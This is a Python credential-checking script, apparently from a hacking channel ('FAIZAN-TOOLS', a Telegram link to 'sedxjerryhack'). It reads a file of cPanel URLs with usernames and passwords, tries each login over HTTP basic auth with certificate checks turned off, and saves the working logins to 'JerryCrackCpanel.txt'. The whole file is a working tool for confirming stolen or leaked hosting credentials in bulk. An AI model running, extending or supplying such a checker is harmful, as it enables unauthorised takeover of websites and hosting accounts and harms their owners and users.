import re
import requests
from colorama import Fore, init ,Style
from requests.auth import HTTPBasicAuth
import colorama
colorama.init(convert=True)


fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA

print("""
[#] Create By ::

    _____   ____  ____  _____   ____  ____       ______   ___    ___   _      _____
|     | /    Tl    j|     T /    T|    \     |      T /   \  /   \ | T    / ___/
|   __jY  o  | |  T l__/  |Y  o  ||  _  Y    |      |Y     YY     Y| |   (   \_ 
|  l_  |     | |  | |   __j|     ||  |  |    l_j  l_j|  O  ||  O  || l___ \__  T
|   _] |  _  | |  | |  /  ||  _  ||  |  |      |  |  |     ||     ||     T/  \ |
|  T   |  |  | j  l |     ||  |  ||  |  |      |  |  l     !l     !|     |\    |
l__j   l__j__j|____jl_____jl__j__jl__j__j      l__j   \___/  \___/ l_____j \___j
                                                                                
                          FAIZAN-TOOLS  https://t.me/sedxjerryhack
                       Cpanel Checker ex : https://site:2083|user|pass
""")

requests.packages.urllib3.disable_warnings()

try:
    sites_file = input("List Cpanels: ")

    with open(sites_file, "r") as sites:
        for site in sites:
            site = site.strip()
            data_cpanel = site

            try:
                ip, username, password = site.split('|')
                print(f" [*] Cpanel : {ip}")
                print(f" [*] Username : {username}")
                print(f" [*] Password : {password}")

                session = requests.Session()
                session.verify = False 
                auth = HTTPBasicAuth(username, password)
                response = session.get(ip, auth=auth)

                if "email_accounts" in response.text:
                    print(f" {fg}[+] Login successful{Style.RESET_ALL}")
                    with open("JerryCrackCpanel.txt", "a") as out:
                        out.write(f"{data_cpanel}\n")
                else:
                    print(f" {fr}[-] Login Failed {Style.RESET_ALL}")

            except ValueError:
                print(f" {fr} [-] Login Failed: Invalid format {Style.RESET_ALL}")

            except Exception as e:
                print(f" {fr} [-] Login Failed: {e} {Style.RESET_ALL}")

except FileNotFoundError:
    print(f" [!] File not found: {sites_file}")
except Exception as ex:
    print(f" [!] An error occurred: {ex}")
finally:
    print("Finished processing sites.")
